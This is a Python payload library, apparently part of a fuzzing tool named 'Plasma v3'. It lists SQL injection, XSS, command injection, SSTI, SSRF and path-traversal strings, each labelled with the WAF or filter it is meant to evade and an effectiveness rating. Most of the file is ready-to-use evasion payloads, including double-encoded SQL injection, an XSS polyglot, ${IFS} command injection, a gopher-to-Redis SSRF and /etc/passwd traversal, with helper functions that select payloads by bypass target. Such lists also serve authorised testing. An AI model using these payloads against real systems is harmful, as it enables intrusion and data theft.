"""
payloads/fuzz_payloads.py — Plasma v3
──────────────────────────────────────
Extended payload library demonstrating evasion effectiveness.

SAMPLE PAYLOADS
───────────────
Each entry includes:
  payload        : the raw injection string
  encoding       : encoding variant applied
  bypass_target  : WAF/filter this is designed to evade
  effectiveness  : "low" | "medium" | "high"

This file is importable as a Python module and also loadable as a config:
    from payloads.fuzz_payloads import SAMPLE_PAYLOADS, get_by_category
"""

from __future__ import annotations

SAMPLE_PAYLOADS: list[dict] = [

    # ── SQL Injection — WAF bypass variants ──────────────────────────────────

    {
        "category":     "sqli",
        "technique":    "error-based",
        "payload":      "' OR '1'='1",
        "encoding":     "raw",
        "bypass_target": "none",
        "effectiveness": "high",
        "notes":        "Classic; most WAFs catch this.",
    },
    {
        "category":     "sqli",
        "technique":    "error-based",
        "payload":      "%27%20OR%20%271%27%3D%271",
        "encoding":     "url-encoded",
        "bypass_target": "signature-based WAF",
        "effectiveness": "medium",
        "notes":        "URL-encoded; bypasses string-match WAFs.",
    },
    {
        "category":     "sqli",
        "technique":    "error-based",
        "payload":      "%2527%2520OR%2520%25271%2527%253D%25271",
        "encoding":     "double-url-encoded",
        "bypass_target": "decode-once WAF",
        "effectiveness": "high",
        "notes":        "Double-URL-encoded; effective against WAFs that decode once.",
    },
    {
        "category":     "sqli",
        "technique":    "comment-injection",
        "payload":      "' UN/**/ION SE/**/LECT NULL--",
        "encoding":     "sql-comment-inject",
        "bypass_target": "keyword-match WAF",
        "effectiveness": "high",
        "notes":        "SQL inline comments break keyword signatures.",
    },
    {
        "category":     "sqli",
        "technique":    "time-based",
        "payload":      "';WAITFOR DELAY '0:0:5'--",
        "encoding":     "raw",
        "bypass_target": "MSSQL",
        "effectiveness": "high",
        "notes":        "MSSQL time-based blind injection.",
    },
    {
        "category":     "sqli",
        "technique":    "unicode",
        "payload":      "\u0027 OR \u00311\u003d\u00311--",
        "encoding":     "unicode-escape",
        "bypass_target": "ASCII-only WAF",
        "effectiveness": "medium",
        "notes":        "Unicode-escaped quote and equals.",
    },

    # ── XSS — filter bypass variants ────────────────────────────────────────

    {
        "category":     "xss",
        "technique":    "reflected",
        "payload":      '"><script>alert(1)</script>',
        "encoding":     "raw",
        "bypass_target": "none",
        "effectiveness": "high",
        "notes":        "Classic; filtered by most WAFs.",
    },
    {
        "category":     "xss",
        "technique":    "event-handler",
        "payload":      "<img src=x onerror=alert(1)>",
        "encoding":     "raw",
        "bypass_target": "script-tag WAF",
        "effectiveness": "high",
        "notes":        "Avoids <script> tag; works when src is reflected.",
    },
    {
        "category":     "xss",
        "technique":    "html-entity",
        "payload":      "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
        "encoding":     "html-entity",
        "bypass_target": "string-match WAF",
        "effectiveness": "medium",
        "notes":        "HTML entity encoding of <script>.",
    },
    {
        "category":     "xss",
        "technique":    "polyglot",
        "payload":      "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert(1))//%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>",
        "encoding":     "polyglot-mixed",
        "bypass_target": "multi-context WAF",
        "effectiveness": "high",
        "notes":        "Context-agnostic polyglot; works in many injection points.",
    },
    {
        "category":     "xss",
        "technique":    "base64-data-uri",
        "payload":      "<iframe src='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>",
        "encoding":     "base64-data-uri",
        "bypass_target": "content-inspection WAF",
        "effectiveness": "medium",
        "notes":        "Data URI with base64-encoded script; bypasses body scan.",
    },

    # ── RCE — command injection bypass variants ───────────────────────────────

    {
        "category":     "rce",
        "technique":    "unix-basic",
        "payload":      "; id",
        "encoding":     "raw",
        "bypass_target": "none",
        "effectiveness": "high",
        "notes":        "Basic Unix command injection.",
    },
    {
        "category":     "rce",
        "technique":    "ifs-bypass",
        "payload":      "${IFS}id",
        "encoding":     "shell-variable",
        "bypass_target": "space-filtering WAF",
        "effectiveness": "high",
        "notes":        "Internal Field Separator substitutes space; bypasses space filters.",
    },
    {
        "category":     "rce",
        "technique":    "ssti",
        "payload":      "{{7*7}}",
        "encoding":     "raw",
        "bypass_target": "n/a",
        "effectiveness": "high",
        "notes":        "Server-Side Template Injection probe (Jinja2/Twig/etc.).",
    },
    {
        "category":     "rce",
        "technique":    "ssti-polyglot",
        "payload":      "${7*7}|{{7*7}}|#{7*7}|<%= 7*7 %>",
        "encoding":     "multi-template",
        "bypass_target": "n/a",
        "effectiveness": "high",
        "notes":        "Multi-engine SSTI probe; catches several template engines at once.",
    },

    # ── SSRF — IP address obfuscation ────────────────────────────────────────

    {
        "category":     "ssrf",
        "technique":    "decimal-ip",
        "payload":      "http://2130706433/",
        "encoding":     "decimal-notation",
        "bypass_target": "127.0.0.1-blocking WAF",
        "effectiveness": "high",
        "notes":        "2130706433 == 127.0.0.1 in decimal; bypasses string blocklists.",
    },
    {
        "category":     "ssrf",
        "technique":    "octal-ip",
        "payload":      "http://0177.0.0.1/",
        "encoding":     "octal-notation",
        "bypass_target": "loopback-blocking WAF",
        "effectiveness": "medium",
        "notes":        "0177 == 127 in octal.",
    },
    {
        "category":     "ssrf",
        "technique":    "dns-rebind",
        "payload":      "http://localtest.me/",
        "encoding":     "dns-alias",
        "bypass_target": "IP-based block",
        "effectiveness": "medium",
        "notes":        "localtest.me resolves to 127.0.0.1; bypasses IP checks.",
    },
    {
        "category":     "ssrf",
        "technique":    "gopher",
        "payload":      "gopher://127.0.0.1:6379/_INFO",
        "encoding":     "protocol-switch",
        "bypass_target": "http-only allow-list",
        "effectiveness": "high",
        "notes":        "Gopher protocol SSRF to Redis; often not blocked.",
    },

    # ── Path Traversal — encoding bypass ─────────────────────────────────────

    {
        "category":     "traversal",
        "technique":    "double-dot-slash",
        "payload":      "../../../../etc/passwd",
        "encoding":     "raw",
        "bypass_target": "none",
        "effectiveness": "high",
        "notes":        "Classic path traversal.",
    },
    {
        "category":     "traversal",
        "technique":    "double-encoded",
        "payload":      "..%252F..%252F..%252Fetc%252Fpasswd",
        "encoding":     "double-url-encoded",
        "bypass_target": "decode-once WAF",
        "effectiveness": "high",
        "notes":        "Double-URL-encoded slashes; effective against WAFs decoding once.",
    },
    {
        "category":     "traversal",
        "technique":    "double-dot-bypass",
        "payload":      "....//....//....//etc/passwd",
        "encoding":     "overlong-sequence",
        "bypass_target": "../ stripping WAF",
        "effectiveness": "medium",
        "notes":        "After strip, ....// collapses to ../.",
    },
]


def get_by_category(category: str) -> list[dict]:
    """Return all sample payloads for a given category."""
    return [p for p in SAMPLE_PAYLOADS if p["category"] == category]


def get_by_effectiveness(level: str) -> list[dict]:
    """Return all sample payloads filtered by effectiveness level."""
    return [p for p in SAMPLE_PAYLOADS if p["effectiveness"] == level]


def get_by_bypass_target(target: str) -> list[dict]:
    """Return payloads designed to bypass a specific WAF/filter type."""
    tl = target.lower()
    return [p for p in SAMPLE_PAYLOADS if tl in p["bypass_target"].lower()]


def summary_table() -> str:
    """Print a formatted summary table of all sample payloads."""
    lines = [
        f"{'Category':<12} {'Technique':<25} {'Encoding':<25} {'Effectiveness':<14} Bypass Target",
        "─" * 100,
    ]
    for p in SAMPLE_PAYLOADS:
        lines.append(
            f"{p['category']:<12} {p['technique']:<25} {p['encoding']:<25} "
            f"{p['effectiveness']:<14} {p['bypass_target']}"
        )
    return "\n".join(lines)
